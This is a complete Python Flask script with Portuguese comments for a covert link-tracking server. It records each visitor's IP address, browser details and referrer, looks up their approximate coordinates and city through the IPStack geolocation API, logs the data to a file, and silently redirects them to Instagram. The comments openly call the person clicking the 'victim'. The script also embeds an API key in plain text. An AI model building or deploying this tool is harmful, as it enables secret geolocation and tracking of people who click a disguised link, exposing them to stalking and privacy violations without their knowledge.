from flask import Flask, request, redirect
import requests
import os
from datetime import datetime

app = Flask(__name__)

# --- CONFIGURAÇÃO OBRIGATÓRIA ---
# Obtenha uma chave GRATUITA em https://ipstack.com/signup_free
API_KEY = "381f44000a003435a40949e702c7d0d7"  # <<< SUBSTITUA ISSO!
API_URL = "http://api.ipstack.com/"

# A URL para a qual você quer redirecionar a vítima após rastrear o clique
URL_DESTINO = "https://www.instagram.com/"

# Nome do arquivo para salvar os logs
ARQUIVO_LOG = "clicks.log"
# --- FIM DA CONFIGURAÇÃO ---

def init_log():
    """Cria o arquivo de log com cabeçalho se não existir."""
    try:
        # Verifica se o arquivo existe e se está vazio
        if not os.path.exists(ARQUIVO_LOG) or os.path.getsize(ARQUIVO_LOG) == 0:
            with open(ARQUIVO_LOG, 'w', encoding='utf-8') as f:
                f.write("Timestamp,IP,User Agent,Referrer,Latitude,Longitude,Cidade,Região,País,Campanha\n")
    except IOError as e:
        print(f"Erro ao criar arquivo de log: {e}")

@app.route('/')
def index():
    return "<h1>Servidor de Rastreamento Ativo</h1><p>Use um endpoint como '/track/minha_campanha'.</p>"

@app.route('/track/<campaign_id>')
def track(campaign_id):
    """Rota principal que captura os dados e redireciona."""
    # 1. Captura dados básicos da requisição
    victim_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'N/A')
    referrer = request.headers.get('Referer', 'N/A')
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 2. Tenta obter a localização geográfica via API
    latitude, longitude, city, region, country = get_geolocation(victim_ip)

    # 3. Prepara os dados para salvar (substitui vírgulas para evitar conflito no CSV)
    user_agent_clean = user_agent.replace(',', ';').replace('\n', ' ')
    referrer_clean = referrer.replace(',', ';').replace('\n', ' ')

    # 4. Formata a linha para o arquivo CSV
    log_line = f'"{timestamp}","{victim_ip}","{user_agent_clean}","{referrer_clean}","{latitude}","{longitude}","{city}","{region}","{country}","{campaign_id}"\n'

    # 5. Salva no arquivo de log
    save_to_file(log_line)

    # 6. Imprime os dados no terminal (feedback imediato)
    print(f"\n--- Clique Registrado ---")
    print(f"Timestamp: {timestamp}")
    print(f"IP: {victim_ip}")
    print(f"Localização: {city}, {region} - {country} ({latitude}, {longitude})")
    print(f"User Agent: {user_agent}")
    print(f"Campanha: {campaign_id}")
    print("------------------------")

    # 7. Redireciona o usuário para o destino final
    return redirect(URL_DESTINO)

def get_geolocation(ip):
    """Consulta a API IPStack para obter dados de localização."""
    # IPs locais não podem ser geolocalizados
    if ip in ['127.0.0.1', 'localhost'] or ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('172.'):
        print(f"IP local detectado ({ip}): geolocalização não disponível")
        return ('Local', 'Local', 'Rede Local', 'Rede Local', 'Rede Local')
    
    try:
        print(f"Consultando geolocalização para IP: {ip}")
        # Para a versão free, use http. Para planos pagos, você pode usar https
        response = requests.get(f"{API_URL}{ip}?access_key={API_KEY}", timeout=10)
        
        print(f"Status da resposta: {response.status_code}")
        
        if response.status_code != 200:
            print(f"Erro na API: Status {response.status_code}")
            return ('Erro API', 'Erro API', 'Erro API', 'Erro API', 'Erro API')
        
        data = response.json()
        print(f"Resposta da API: {data}")
        
        # Verifica se há erro na resposta da API
        if 'error' in data:
            print(f"Erro da API IPStack: {data['error']}")
            return ('Erro API', 'Erro API', 'Erro API', 'Erro API', 'Erro API')
        
        # Retorna os dados relevantes, tratando possíveis valores nulos
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        city = data.get('city')
        region = data.get('region_name')
        country = data.get('country_name')
        
        return (
            str(latitude) if latitude is not None else 'N/A',
            str(longitude) if longitude is not None else 'N/A',
            str(city) if city is not None else 'N/A',
            str(region) if region is not None else 'N/A',
            str(country) if country is not None else 'N/A'
        )
    except Exception as e:
        print(f"Erro ao consultar geolocalização: {e}")
        return ('Erro', 'Erro', 'Erro', 'Erro', 'Erro')

def save_to_file(log_line):
    """Salva os dados capturados no arquivo de log."""
    try:
        with open(ARQUIVO_LOG, 'a', encoding='utf-8') as f:
            f.write(log_line)
    except IOError as e:
        print(f"Erro ao salvar no arquivo de log: {e}")

if __name__ == '__main__':
    # Inicializa o arquivo de log antes de rodar o servidor
    init_log()
    print("[+] Arquivo de log inicializado.")
    print("[+] Servidor de rastreamento iniciando...")
    print(f"[+] URL de destino configurada: {URL_DESTINO}")
    print(f"[+] Logs serão salvos em: {ARQUIVO_LOG}")
    print("[+] Aguardando cliques...\n")
    # 'debug=True' é útil para desenvolvimento, mas NÃO use em produção.
    app.run(host='0.0.0.0', port=5000, debug=False)
